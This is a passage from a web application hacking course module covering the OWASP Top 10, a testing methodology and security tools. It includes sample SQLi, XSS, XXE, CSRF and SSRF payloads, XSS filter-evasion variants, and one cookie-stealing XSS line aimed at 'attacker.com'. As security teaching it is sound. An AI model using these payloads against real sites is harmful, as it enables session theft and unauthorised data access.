# Introduction to Hacking Web Applications

## Introduction

Web applications are among the most common attack vectors in modern cybersecurity. This module covers the fundamental techniques and methodologies for identifying and exploiting vulnerabilities in web applications.

## Why Web Applications?

- **Ubiquitous**: Nearly every organization has a web presence
- **Complex**: Modern web apps have large attack surfaces
- **Accessible**: Available from anywhere on the Internet
- **Valuable**: Often contain sensitive data and business logic
- **Evolving**: New frameworks and technologies introduce new vulnerabilities

## OWASP Top 10

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) represents the most critical web application security risks:

1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection**
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable and Outdated Components**
7. **Identification and Authentication Failures**
8. **Software and Data Integrity Failures**
9. **Security Logging and Monitoring Failures**
10. **Server-Side Request Forgery (SSRF)**

## Web Application Architecture

### Components

- **Frontend**: HTML, CSS, JavaScript (React, Vue, Angular)
- **Backend**: Server-side logic (Node.js, Python, PHP, Java, .NET)
- **Database**: Data storage (MySQL, PostgreSQL, MongoDB)
- **API**: RESTful, GraphQL, SOAP
- **Authentication**: Session management, JWT, OAuth
- **Infrastructure**: Web servers (Apache, Nginx), load balancers, CDNs

## Common Web Vulnerabilities

### 1. SQL Injection (SQLi)

Injecting malicious SQL code into application queries.

```sql
-- Basic SQLi
' OR '1'='1

-- Union-based SQLi
' UNION SELECT username, password FROM users--

-- Time-based blind SQLi
' AND SLEEP(5)--

-- Boolean-based blind SQLi
' AND 1=1--
```

**Tools:**
- SQLMap
- jSQL Injection
- Havij

### 2. Cross-Site Scripting (XSS)

Injecting malicious scripts into web pages viewed by other users.

```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- Stored XSS -->
<img src=x onerror=alert('XSS')>

<!-- DOM-based XSS -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

**Types:**
- **Reflected XSS**: Payload in URL or form input
- **Stored XSS**: Payload stored in database
- **DOM-based XSS**: Client-side JavaScript vulnerability

### 3. Cross-Site Request Forgery (CSRF)

Forcing authenticated users to perform unwanted actions.

```html
<!-- CSRF attack example -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### 4. Insecure Direct Object References (IDOR)

Accessing unauthorized resources by manipulating references.

```
# Vulnerable endpoint
https://example.com/user/profile?id=123

# Try accessing other users
https://example.com/user/profile?id=124
https://example.com/user/profile?id=125
```

### 5. Security Misconfiguration

- Default credentials
- Unnecessary features enabled
- Verbose error messages
- Missing security headers
- Outdated software

### 6. Sensitive Data Exposure

- Unencrypted data transmission
- Weak encryption algorithms
- Exposed API keys and credentials
- Insecure data storage

### 7. XML External Entity (XXE)

Exploiting XML parsers to access local files or internal systems.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### 8. Broken Authentication

- Weak password policies
- Credential stuffing
- Session fixation
- Missing account lockout
- Predictable session tokens

### 9. Server-Side Request Forgery (SSRF)

Forcing the server to make requests to unintended locations.

```
# SSRF example
https://example.com/fetch?url=http://localhost:8080/admin
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

### 10. Remote Code Execution (RCE)

Executing arbitrary code on the server.

```php
# PHP RCE via command injection
system($_GET['cmd']);

# Deserialization RCE
unserialize($_GET['data']);
```

## Web Application Testing Methodology

### 1. Information Gathering

- Identify technologies (Wappalyzer, BuiltWith)
- Map application structure
- Discover hidden endpoints
- Review client-side code
- Check robots.txt and sitemap.xml

### 2. Authentication Testing

- Test password policies
- Check for default credentials
- Test account lockout mechanisms
- Analyze session management
- Test password reset functionality

### 3. Authorization Testing

- Test for IDOR vulnerabilities
- Check privilege escalation
- Test horizontal and vertical access controls
- Verify role-based access

### 4. Input Validation Testing

- Test for injection vulnerabilities
- Fuzzing input fields
- Test file upload functionality
- Check for XSS vulnerabilities
- Test API endpoints

### 5. Business Logic Testing

- Test workflow bypasses
- Check for race conditions
- Test payment manipulation
- Verify business rules enforcement

### 6. Client-Side Testing

- Review JavaScript code
- Test DOM-based vulnerabilities
- Check for sensitive data in client code
- Test client-side validation bypasses

## Essential Tools

### Proxy Tools

**Burp Suite** (Industry Standard)
- Intercept and modify HTTP/HTTPS traffic
- Spider and scanner
- Intruder for automated attacks
- Repeater for manual testing
- Extensions ecosystem

**OWASP ZAP** (Free Alternative)
- Automated scanner
- Passive and active scanning
- Fuzzing capabilities
- API testing

### Browser Tools

- **Developer Tools**: Inspect HTML, JavaScript, network traffic
- **Cookie Editor**: Modify cookies
- **Wappalyzer**: Identify technologies
- **FoxyProxy**: Manage proxy settings

### Specialized Tools

- **SQLMap**: Automated SQL injection
- **XSSer**: XSS exploitation
- **Commix**: Command injection exploitation
- **WPScan**: WordPress vulnerability scanner
- **Nikto**: Web server scanner
- **DirBuster/Gobuster**: Directory enumeration

### API Testing Tools

- **Postman**: API development and testing
- **Insomnia**: REST client
- **curl**: Command-line HTTP client
- **httpie**: User-friendly HTTP client

## Web Application Firewall (WAF) Bypass

### Common Techniques

```
# Case manipulation
<ScRiPt>alert('XSS')</sCrIpT>

# Encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

# Null bytes
<script>alert('XSS')%00</script>

# Comment insertion
<scr<!--comment-->ipt>alert('XSS')</script>

# Alternative syntax
<svg/onload=alert('XSS')>
```

## Burp Suite Workflow

1. **Configure Proxy**: Set browser to use Burp proxy (127.0.0.1:8080)
2. **Spider**: Crawl the application to map structure
3. **Scan**: Run automated vulnerability scanner
4. **Manual Testing**: Use Repeater and Intruder for targeted testing
5. **Document**: Track findings in Burp's issue tracker

## API Security Testing

### REST API Testing

```bash
# Enumerate endpoints
ffuf -u https://api.example.com/FUZZ -w api-endpoints.txt

# Test authentication
curl -X GET https://api.example.com/users -H "Authorization: Bearer TOKEN"

# Test for IDOR
curl https://api.example.com/user/1
curl https://api.example.com/user/2

# Test HTTP methods
curl -X DELETE https://api.example.com/user/1
```

### GraphQL Testing

```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Query for sensitive data
{
  users {
    id
    username
    email
    password
  }
}
```

## Best Practices

- **Authorization**: Always have written permission
- **Scope**: Test only authorized applications
- **Data Handling**: Don't exfiltrate real user data
- **Impact**: Avoid DoS and destructive actions
- **Reporting**: Document findings professionally
- **Validation**: Verify all findings before reporting

## Vulnerable Practice Applications

- **DVWA** (Damn Vulnerable Web Application)
- **WebGoat** (OWASP)
- **bWAPP** (Buggy Web Application)
- **Juice Shop** (OWASP)
- **Mutillidae**
- **HackTheBox** web challenges
- **PortSwigger Web Security Academy**

## Security Headers

Important security headers to check:

```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
X-XSS-Protection: 1; mode=block
```

## Resources

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

## Next Steps

After understanding web application vulnerabilities, you'll learn about attacking authentication mechanisms and cracking passwords.

